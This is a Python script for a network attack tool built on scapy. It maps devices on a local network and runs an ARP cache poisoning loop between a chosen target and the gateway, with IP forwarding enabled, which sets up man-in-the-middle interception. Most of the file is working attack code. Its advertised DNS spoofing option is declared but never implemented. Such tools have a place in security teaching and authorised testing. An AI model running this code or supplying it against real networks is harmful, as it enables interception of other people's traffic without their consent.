#!/usr/bin/python3

from scapy.all import Ether, ARP, srp, send, get_if_addr, conf
import argparse
import time
import os
import subprocess
import socket
import sys
import builtins
import ipaddress
from concurrent.futures import ThreadPoolExecutor, as_completed

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    # Additional colors
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    BROWN = "\033[0;33m"
    # Bold
    BOLD = '\033[1m'
    BOLD_RED = '\033[1;31m'
    BOLD_GREEN = '\033[1;32m'
    BOLD_YELLOW = '\033[1;33m'
    BOLD_BLUE = '\033[1;34m'
    BOLD_MAGENTA = '\033[1;35m'
    BOLD_CYAN = '\033[1;36m'
    BOLD_WHITE = '\033[1;37m'
    # Underline
    UNDERLINE = '\033[4m'
    UNDERLINE_RED = '\033[4;31m'
    UNDERLINE_GREEN = '\033[4;32m'
    UNDERLINE_YELLOW = '\033[4;33m'
    UNDERLINE_BLUE = '\033[4;34m'
    UNDERLINE_MAGENTA = '\033[4;35m'
    UNDERLINE_CYAN = '\033[4;36m'
    UNDERLINE_WHITE = '\033[4;37m'

    HTTP = '\033[31m'  # Red for HTTP
    HTTPS = '\033[32m'  # Green for HTTPS

M_IMPORTANT = '[!]'
M_INFO = '[-]'
M_SUCCESS = '[+]'
M_ERROR = '[X]'
M_TYPES = [M_IMPORTANT, M_INFO, M_SUCCESS, M_ERROR]

SUBNET_SIZE = 256
MAX_POOL_THREAD_WORKERS = 100

# Globals
argv = None

def color_print(*args, color=Colors.ENDC, **kwargs):
    # Call the original print function with the color
    message = ' '.join(map(str, args))
    builtins.print(f"{color}{message}{Colors.ENDC}", **kwargs)

def print(*args, **kwargs):
    if (len(args) <= 0):
        return color_print(*args, color=Colors.ENDC, **kwargs)
    
    largs = list(map(str, args))[0].split(' ')
    if (len(largs) <= 0):
        return color_print(*args, color=Colors.ENDC, **kwargs)

    if (argv.quiet and largs[0] in M_TYPES):
        return
    
    if (largs[0] == M_IMPORTANT):
        return color_print(*args, color=Colors.HEADER, **kwargs)
    elif (largs[0] == M_INFO):
        return color_print(*args, color=Colors.CYAN, **kwargs)
    elif (largs[0] == M_ERROR):
        return color_print(*args, color=Colors.FAIL, **kwargs)
    elif (largs[0] == M_SUCCESS):
        return color_print(*args, color=Colors.OKGREEN, **kwargs)
    
    color_print(*args, color=Colors.ENDC, **kwargs)

def arg_parse_init():
    global argv

    parser = argparse.ArgumentParser(
                    prog='nst - Network Security/Spoofing Tool',
                    description='Network Tool that allows: Enumerating LAN network, ARP spoofing, DNS spoofing',
                    epilog='© AI')
    parser.add_argument('-v', '--verbose', action='store_true', help='be more verbose')
    parser.add_argument('-e', '--enumerate', action='store_true', help='enumerate LAN network')
    parser.add_argument('-q', '--quiet', action='store_true', help='print no output')
    parser.add_argument('-a', '--arp-spoof', action='store_true', help='ARP spoof LAN devices')
    parser.add_argument('-d', '--dns-spoof', action='store_true', help='ARP spoof LAN devices')

    argv = parser.parse_args()

    return argv

def validate_ipv4(ipv4: str) -> str:
    """
    @brief Validate ipv4
    @param ipv4: ipv4 address
    """

    try:
        ipv4 = ipv4.strip()
        ipaddress.ip_address(ipv4)
        return ipv4
    except Exception as e:
        print(f"{M_ERROR} Invalid IPv4 address: {ipv4}")
        sys.exit(1)

def input_ipv4(message: str, default: str=None) -> str:
    """
    @brief Input ipv4
    @param message: input text message 
    @param default: default ipv4 (if blank input)
    """

    try:
        print(f"{M_INFO} {message}", end='')
        ipv4 = input().strip()
        if default and ipv4 == '': # Allow blank input (default taken)
                return default
        return validate_ipv4(ipv4)
        
    except KeyboardInterrupt:
        print(f"{M_ERROR} Detected CTRL+C!")
        sys.exit(0)

def _enable_linux_iproute():
    """
    Enables IP route ( IP Forward ) in linux-based distro
    """
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            # already enabled
            return
    with open(file_path, "w") as f:
        builtins.print(1, file=f)

def _enable_windows_iproute():
    """
    Enables IP route (IP Forwarding) in Windows
    """
    from services import WService
    # enable Remote Access service
    service = WService("RemoteAccess")
    service.start()

def enable_ip_route(verbose=True):
    """
    Enables IP forwarding
    """
    if verbose:
        print(f"{M_IMPORTANT} Enabling IP Routing...")
    _enable_windows_iproute() if "nt" in os.name else _enable_linux_iproute()
    if verbose:
        print(f"{M_IMPORTANT} IP Routing enabled.")

def get_mac(ip):
    """
    Returns MAC address of any device connected to the network
    If ip is down, returns None instead
    """
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=1, verbose=0)
    if ans:
        return ans[0][1].src
    return None

def arp_spoof(target_ip, host_ip, verbose=True):
    """
    Spoofs `target_ip` saying that we are `host_ip`.
    Accomplished by changing the ARP Cache of target_ip (Cache Poisoning)
    """
    # get the mac address of the target
    target_mac = get_mac(target_ip)
    # craft the arp 'is-at' operation packet, in other words; an ARP response
    # we don't specify 'hwsrc' (source MAC address)
    # because by default, 'hwsrc' is the real MAC address of the sender (ours)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    # send the packet
    # verbose = 0 means that we send the packet without printing any thing
    send(arp_response, verbose=0)
    if verbose:
        # get the MAC address of the default interface we are using
        self_mac = ARP().hwsrc
        print("{} Sent to {} : {} is-at {}".format(M_SUCCESS, target_ip, host_ip, self_mac))

def arp_spoof_restore(target_ip, host_ip, verbose=True):
    """
    Restores the normal process of a regular network
    This is done by sending the original informations 
    (real IP and MAC of `host_ip` ) to `target_ip`
    """
    # get the real MAC address of target
    target_mac = get_mac(target_ip)
    # get the real MAC address of spoofed (gateway, i.e router)
    host_mac = get_mac(host_ip)
    # crafting the restoring packet
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")
    # sending the restoring packet
    # to restore the network to its normal process
    # we send each reply seven times for a good measure (count=7)
    send(arp_response, verbose=0, count=7)
    if verbose:
        print("{} Sent to {} : {} is-at {}".format(M_SUCCESS, target_ip, host_ip, host_mac))

def get_routing_prefix(ipv4: str, subnetmask: str) -> str:
    """
    Get routing prefix of ipv4 with subnet mask
    Example: ipv4 = '10.0.0.35', subnetmask = '255.255.255.0' => '10.0.0.0'
    """
    ipv4_parts = list(map(lambda x: int(x), ipv4.split('.')))
    subnetmask_parts = list(map(lambda x: int(x), subnetmask.split('.')))
    routing_prefix_parts = []
    for i in range(min(len(ipv4_parts), len(subnetmask_parts))):
        routing_prefix_parts.append(str(ipv4_parts[i] & subnetmask_parts[i]))
    return '.'.join(routing_prefix_parts)

def get_subnetmask_prefix_len(subnetmask: str, cidr: bool = True) -> int:
    """
    Get subnet mask's prefix len
    Example: 255.255.255.0 => 24
    """
    slen = len(subnetmask.replace(' ', '').replace('\n', '').replace('255.', '').split('.'))
    if (cidr):
        return 32 - slen * 8
    return slen

def get_network_info() -> dict:
    """
    @brief Get Network Information
    @return: dict: {'self_ipv4': ..., 'subnetmask': ..., 'net_ipv4': ..., 'gateway': ...}
    """
    
    self_ipv4 = get_if_addr(conf.iface).replace('\n', '')
    subnetmask = subprocess.check_output("/sbin/ifconfig wlan0 | awk '/netmask /{ print $4;}'", shell=True).decode().replace('\n', '').strip()
    net_ipv4 = get_routing_prefix(str(self_ipv4), str(subnetmask))
    _gateway = subprocess.check_output("/sbin/ip route | awk '/default /{ print $3;}'", shell=True).decode().replace('\n', '').strip() # _gateway IPv4
    
    net_info = {'self_ipv4': self_ipv4, 'subnetmask': subnetmask, 'net_ipv4': net_ipv4, 'gateway': _gateway}

    return net_info

def get_device_info(ip):
    """
    Get device information (MAC address and hostname) for a given IP address.
    """
    mac = get_mac(ip)
    if mac:
        try:    
            hostname = socket.gethostbyaddr(ip)[0]
        except socket.herror:
            hostname = None
        return ip, mac, hostname
    return ip, None, None


def enumerate_lan(net_info: dict) -> dict:
    """
    @brief Enumeration Network Devices
    @param net_info: network information
    @return: dict: {ipv4: {'ipv4': ..., 'mac': ..., 'hostname': ...}}
    """
    
    lan_devices = {}
    subnetmask_prefix_len = get_subnetmask_prefix_len(net_info['subnetmask'], False)
    print(f'{M_INFO} Enumerating {SUBNET_SIZE ** subnetmask_prefix_len} LAN devices on {net_info["net_ipv4"]}/{get_subnetmask_prefix_len(net_info["subnetmask"])}')
    
    ip_list = []
    for i in range(SUBNET_SIZE ** subnetmask_prefix_len):
        ipv4 = net_info['net_ipv4'].split('.')
        ipv4[1] = str(i // SUBNET_SIZE // SUBNET_SIZE)
        ipv4[2] = str(i // SUBNET_SIZE)
        ipv4[3] = str(i % SUBNET_SIZE)
        ipv4 = '.'.join(ipv4)
        ip_list.append(ipv4)
    
    try:
        # Use ThreadPoolExecutor for parallel requests
        with ThreadPoolExecutor(max_workers=MAX_POOL_THREAD_WORKERS) as executor:
            future_to_ip = {executor.submit(get_device_info, ip): ip for ip in ip_list}
            for future in as_completed(future_to_ip):
                ip = future_to_ip[future]
                try:
                    ip, mac, hostname = future.result()
                    if mac:
                        lan_devices[ip] = {'ipv4': ip, 'mac': mac, 'hostname': hostname}
                        print(lan_devices[ip])
                except Exception as exc:
                    print(f'{M_ERROR} Error fetching data for {ip}: {exc}')
    except KeyboardInterrupt:
        print(f"{M_ERROR} Detected CTRL+C!")
    finally:
        return lan_devices

def arp_spoofing(net_info: dict):
    """
    @brief ARP spoofing
    @param net_info: network information
    """

    global argv

    target_ipv4 = ''
    host_ipv4 = ''
    try:
        # Enable IP Forwarding
        enable_ip_route()

        print(f'{M_IMPORTANT} ARP Cache Poisoning:')
        target_ipv4 = input_ipv4('Target: ')
        host_ipv4 = input_ipv4('Host: ', net_info['gateway'])
        print("Target:", target_ipv4)
        print("Host:", host_ipv4)

        while True:
            # Telling the `target` that we are the `host`
            arp_spoof(target_ipv4, host_ipv4, not argv.quiet)
            # Telling the `host` that we are the `target`
            arp_spoof(host_ipv4, target_ipv4, not argv.quiet)
            # sleep for one second
            time.sleep(0.5)
    except KeyboardInterrupt:
        print(f"{M_ERROR} Detected CTRL+C! restoring the network, please wait...")
        arp_spoof_restore(host_ipv4, target_ipv4)
        arp_spoof_restore(target_ipv4, host_ipv4)
    except Exception as e:
        print(f"{M_ERROR} Error: {e}")

def main():
    global argv
    arg_parse_init()
    print(argv)

    net_info = get_network_info()

    if (not argv.quiet):
        print(f'{M_INFO} Network Information:')
        print(f'{net_info}')

    lan_devices = {}
    if (argv.enumerate):
        lan_devices = enumerate_lan(net_info)
        net_info['lan_devices'] = lan_devices
    
    if (argv.arp_spoof):
        arp_spoofing(net_info)

    if (not argv.quiet):
        print(f'{M_IMPORTANT} Done!')

if __name__ == '__main__':
    main()
